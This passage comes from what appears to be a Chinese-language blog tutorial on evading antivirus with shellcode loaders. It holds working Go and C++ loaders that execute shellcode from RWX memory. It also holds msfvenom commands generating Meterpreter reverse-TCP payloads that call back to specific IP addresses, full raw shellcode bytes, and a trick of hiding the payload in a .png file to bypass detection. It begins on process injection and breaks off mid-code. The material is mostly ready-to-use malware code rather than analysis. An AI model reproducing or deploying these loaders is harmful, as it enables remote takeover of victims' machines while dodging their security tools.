&#125;</span><br><span class="line">    <span class="comment">// 调用RtlCopyMemory来将shellcode加载进内存当中</span></span><br><span class="line">    _, _, err = RtlCopyMemory.Call(addr, (<span class="type">uintptr</span>)(unsafe.Pointer(&amp;shellcode[<span class="number">0</span>])), <span class="type">uintptr</span>(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">    checkErr(err)</span><br><span class="line">    <span class="comment">// syscall来运行shellcode，跳转到shellcode首地址开始执行</span></span><br><span class="line">    syscall.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用</span></span><br><span class="line"><span class="comment">#生成payload</span></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.58.133 lport=6666 -f c</span><br><span class="line"><span class="comment">#注意payload格式要改为代码中那样，可以使用文本编辑器采用正则语法批量的替换修改和删除</span></span><br><span class="line"><span class="comment">#直接执行</span></span><br><span class="line">go run 文件.go</span><br><span class="line"><span class="comment">#编译</span></span><br><span class="line">go build -ldflags=<span class="string">&quot;-s -w&quot;</span> -o shellcode-launch-attack.exe 文件.go</span><br></pre></td></tr></table></figure><h2 id="shellcodeLoder-nim"><a href="#shellcodeLoder-nim" class="headerlink" title="shellcodeLoder-nim"></a>shellcodeLoder-nim</h2><ul><li>nim优点：</li></ul><blockquote><ul><li>nim也是一种编程语言，在免杀方面具有优势（语言小众，查杀可能不完善），相对于纯c++的代码免杀效果确实好一点，但是如果需要做的事情够多还是一样会被检测出来</li><li>可以直接编译为C、C+、Objective-C和Javascript.</li><li>语法简单，不依赖运行时虚拟机。</li><li>具有极其成熟的外部接口API。</li><li>跨平台交叉编译。</li><li>可以将代码直接编译为Javascript,甚至初步支持WebAssembly</li></ul></blockquote><blockquote><p>nim作者提高的代码示例：<a href="https://github.com/byt3bl33d3r/offensiveNim">https://github.com/byt3bl33d3r/offensiveNim</a></p></blockquote><ul><li>Nim安装</li></ul><blockquote><p><a href="https://nim-lang.org/install.html">https://nim-lang.org/install.html</a></p></blockquote><p>下载压缩包解压后，放入安装目录后执行finish.exe 进行环境安装配置</p><ul><li>Nim图形化加载shellcode，快速生成免杀可执行文件</li></ul><blockquote><p><a href="https://github.com/aeverj/NimShellCodeLoader">https://github.com/aeverj/NimShellCodeLoader</a> </p></blockquote><p>编译：直接通过vs编译后放入项目首文件夹</p><h2 id="Shellcode混淆免杀"><a href="#Shellcode混淆免杀" class="headerlink" title="Shellcode混淆免杀"></a>Shellcode混淆免杀</h2><h3 id="shellcode混淆简介"><a href="#shellcode混淆简介" class="headerlink" title="shellcode混淆简介"></a>shellcode混淆简介</h3><p>我们被静态查杀，主要就是被检测到了shellcode特征码。为了将其特征码打乱不被检测到。就需要进行混淆</p><p>其实就是把我们的shellcode进行加密：如base64，xor，AES等等。加密后再通过代码将我们加密过的shellcode解密~~即可实现免杀</p><h3 id="具体实现过程"><a href="#具体实现过程" class="headerlink" title="具体实现过程"></a>具体实现过程</h3><ol><li>生成shellcode</li><li>把shellcode加密</li><li>构造shellcode加载器</li><li>shellcode加载器把我们加密过后的shellcode解密</li><li>执行程序，上线C2</li></ol><p>总的来说，和普通的shellcode加载器没区别，只是将shellcode做了一些编码，以及向对应查杀的函数做了一些处理，不同语言实现的功能和方法都不同</p><h2 id="Shellcode分离免杀"><a href="#Shellcode分离免杀" class="headerlink" title="Shellcode分离免杀"></a>Shellcode分离免杀</h2><p>分离免杀实际上就是将我们的shellcode和加载器分离，首先通过加载器读取文件中的shellcode，然后加载进内存执行，在这个过程中我们的shellcode并不在加载器中，而是一个静态文件(图片，二进制文件等),所以杀软并不会查杀这些静态文件，仅仅对加载器查杀，那么我们只需考虑对加载器进行免杀即可。</p><h1 id="C-加载shellcode"><a href="#C-加载shellcode" class="headerlink" title="C++加载shellcode"></a>C++加载shellcode</h1><h2 id="C-loader-1"><a href="#C-loader-1" class="headerlink" title="C++loader-1"></a>C++loader-1</h2><h3 id="VirtualAlloc（上节讲过的代码-常见）"><a href="#VirtualAlloc（上节讲过的代码-常见）" class="headerlink" title="VirtualAlloc（上节讲过的代码,常见）"></a>VirtualAlloc（上节讲过的代码,常见）</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)  <span class="comment">//去除黑色框框（一）</span></span></span><br><span class="line"><span class="comment">// msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=124.223.217.243 lport=4321 -f c</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line"><span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x20\x48\x8b\x72\x50\x4d\x31\xc9\x48\x0f\xb7\x4a\x4a&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x41\x51\x8b\x42\x3c\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x44&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x40\x20\x49\x01\xd0\x8b\x48\x18\xe3\x56\x4d\x31\xc9\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1&quot;</span></span><br><span class="line"><span class="string">&quot;\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45&quot;</span></span><br><span class="line"><span class="string">&quot;\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9&quot;</span></span><br><span class="line"><span class="string">&quot;\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\xbc\x02\x00\x10\xe1\x7c\xdf\xd9\xf3\x41\x54\x49\x89\xe4&quot;</span></span><br><span class="line"><span class="string">&quot;\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a&quot;</span></span><br><span class="line"><span class="string">&quot;\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89&quot;</span></span><br><span class="line"><span class="string">&quot;\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba&quot;</span></span><br><span class="line"><span class="string">&quot;\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5&quot;</span></span><br><span class="line"><span class="string">&quot;\xe8\x93\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9&quot;</span></span><br><span class="line"><span class="string">&quot;\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31&quot;</span></span><br><span class="line"><span class="string">&quot;\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8&quot;</span></span><br><span class="line"><span class="string">&quot;\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68\x00\x40&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//  void* Memory; //等价于PVOID</span></span><br><span class="line">    PVOID Memory = <span class="literal">NULL</span>;</span><br><span class="line">    Memory=<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="comment">//  ShowWindow(GetConsoleWindow(), SW_HIDE);  //去除黑色框框（二）</span></span><br><span class="line">    <span class="built_in">memcpy</span>(Memory, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">    ((<span class="built_in">void</span>(*)())Memory)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-loader-2"><a href="#C-loader-2" class="headerlink" title="C++loader-2"></a>C++loader-2</h2><h3 id="VirtualAlloc（和load1对比）"><a href="#VirtualAlloc（和load1对比）" class="headerlink" title="VirtualAlloc（和load1对比）"></a>VirtualAlloc（和load1对比）</h3><blockquote><p>typedef 声明</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(_stdcall* CODE)</span><span class="params">()</span></span>;  <span class="comment">// 定义一个函数指针类型CODE</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line"><span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52&quot;</span></span><br><span class="line">......</span><br><span class="line"><span class="string">&quot;\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PVOID p = <span class="literal">NULL</span>;</span><br><span class="line">    p = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(p, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">  <span class="comment">//和load1的区别在此，使用的运行shellcode的方法不一样，先在前面声明了一个名为code的函数指针</span></span><br><span class="line">    CODE code = (CODE)p;</span><br><span class="line">    <span class="built_in">code</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-loader-3"><a href="#C-loader-3" class="headerlink" title="C++loader-3"></a>C++loader-3</h2><h3 id="分离免杀-VirtualAlloc"><a href="#分离免杀-VirtualAlloc" class="headerlink" title="分离免杀 + VirtualAlloc"></a>分离免杀 + VirtualAlloc</h3><p>这简单的分离免杀，竟然可以过火绒！？</p><blockquote><p>把shellcode放入 alvin.png 文件中，与 shellcode 加载器放到同一个目录。alvin.png可以用cs或者msf生成的bin或者raw文件改后缀为png即可</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable : 4996)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//主要区别在此</span></span><br><span class="line">    FILE* fp;<span class="comment">//定义文件指针</span></span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* buffer;</span><br><span class="line">    fp = <span class="built_in">fopen</span>(<span class="string">&quot;alvin.png&quot;</span>, <span class="string">&quot;rb&quot;</span>);<span class="comment">//以二进制（b），读文件（r）</span></span><br><span class="line">    <span class="built_in">fseek</span>(fp, <span class="number">0</span>, SEEK_END);<span class="comment">//C 库函数 int fseek(FILE *stream, long int offset, int whence) 设置流 stream 的文件位置为给定的偏移 offset，参数 offset 意味着从给定的 whence 位置查找的字节数。</span></span><br><span class="line">    size = <span class="built_in">ftell</span>(fp);<span class="comment">//C 库函数 long int ftell(FILE *stream) 返回给定流 stream 的当前文件位置。相当于计算大小</span></span><br><span class="line">    <span class="built_in">fseek</span>(fp, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">    buffer = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(size);<span class="comment">//申请空间的指针</span></span><br><span class="line">    <span class="built_in">fread</span>(buffer, size, <span class="number">1</span>, fp);<span class="comment">//从fp读取数据到buffer中</span></span><br><span class="line">    <span class="comment">//C 库函数 size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream) 从给定流 stream 读取数据到 ptr 所指向的数组中。</span></span><br><span class="line">    <span class="comment">//后面就一样了</span></span><br><span class="line">    <span class="type">void</span>* exec = <span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(exec, buffer, size);</span><br><span class="line">    ((<span class="built_in">void</span>(*) ())exec)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-loader-4"><a href="#C-loader-4" class="headerlink" title="C++loader-4"></a>C++loader-4</h2><h3 id="CreateFileA-VirtualAlloc"><a href="#CreateFileA-VirtualAlloc" class="headerlink" title="CreateFileA + VirtualAlloc"></a>CreateFileA + VirtualAlloc</h3><blockquote><p>能不能过杀软还没测</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//打开要执行的ShellCode文件，CreateFileA函数打开文件，返回句柄，我们就可以对文件进行操作</span></span><br><span class="line">    HANDLE hFile = <span class="built_in">CreateFileA</span>(<span class="string">&quot;payload.bin&quot;</span>, GENERIC_READ, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_ALWAYS, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)<span class="comment">//如果返回句柄出错，则怎么样怎么样  </span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreateFile Error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DWORD dwSize = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//获取ShellCode的总大小</span></span><br><span class="line">    dwSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">//PVOID lpAddress = NULL;</span></span><br><span class="line">    <span class="comment">//申请一块可读可写可执行的内存</span></span><br><span class="line">    LPVOID lpAddress = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (lpAddress == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;VirtualAlloc EWrror&quot;</span>);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//将文件读取到申请的内存中</span></span><br><span class="line">    DWORD dwRead = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">ReadFile</span>(hFile, lpAddress, dwSize, &amp;dwRead, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//执行ShellCode</span></span><br><span class="line">    ((<span class="built_in">void</span>(*)())lpAddress)();</span><br><span class="line">    <span class="comment">//执行shellcode还有其他方法__asm()，涉及到汇编的知识，可以使用上述方式执行shellcode，也可以使用汇编语言，执行,如下：不过实际编译会出问题 先暂时放在这里！</span></span><br><span class="line">    <span class="comment">//__asm()&#123;call lpAddress;&#125;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注：如果gcc编译不了就要使用visual studio来编译了~~</p></blockquote><h2 id="C-loader-5"><a href="#C-loader-5" class="headerlink" title="C++loader-5"></a>C++loader-5</h2><h3 id="shellcode进程注入-OpenProcess-VirtualAllocEx-CreateRemoteThread"><a href="#shellcode进程注入-OpenProcess-VirtualAllocEx-CreateRemoteThread" class="headerlink" title="shellcode进程注入 + OpenProcess + VirtualAllocEx + CreateRemoteThread"></a>shellcode进程注入 + OpenProcess + VirtualAllocEx + CreateRemoteThread</h3><p>需要传入进程参数pid，这个pid可以注入计算机或者ie等等各种进程之中。我们拿到的shell的pid就是我们注入进程的pid，我们的shellcode类似于寄生在其进程之中~~~~</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#生成shellcode</span></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=124.223.217.243 lport=4321 -f c</span><br><span class="line"><span class="comment">#shellcode</span></span><br><span class="line">unsigned char buf[] =</span><br><span class="line"><span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x20\x48\x8b\x72\x50\x4d\x31\xc9\x48\x0f\xb7\x4a\x4a&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x41\x51\x8b\x42\x3c\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x44&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x40\x20\x49\x01\xd0\x8b\x48\x18\xe3\x56\x4d\x31\xc9\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1&quot;</span></span><br><span class="line"><span class="string">&quot;\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45&quot;</span></span><br><span class="line"><span class="string">&quot;\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9&quot;</span></span><br><span class="line"><span class="string">&quot;\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\xbc\x02\x00\x10\xe1\x7c\xdf\xd9\xf3\x41\x54\x49\x89\xe4&quot;</span></span><br><span class="line"><span class="string">&quot;\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a&quot;</span></span><br><span class="line"><span class="string">&quot;\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89&quot;</span></span><br><span class="line"><span class="string">&quot;\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba&quot;</span></span><br><span class="line"><span class="string">&quot;\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5&quot;</span></span><br><span class="line"><span class="string">&quot;\xe8\x93\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9&quot;</span></span><br><span class="line"><span class="string">&quot;\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31&quot;</span></span><br><span class="line"><span class="string">&quot;\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8&quot;</span></span><br><span class="line"><span class="string">&quot;\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68\x00\x40&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#利用sublime对值处理：</span></span><br><span class="line">\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x4d\x31\xc9\x48\x0f\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x41\x51\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x44\x8b\x40\x20\x49\x01\xd0\x8b\x48\x18\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5\x49\xbc\x02\x00\x10\xe1\x7c\xdf\xd9\xf3\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5</span><br></pre></td></tr></table></figure><p>将shellcode填入下方，并编译</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span 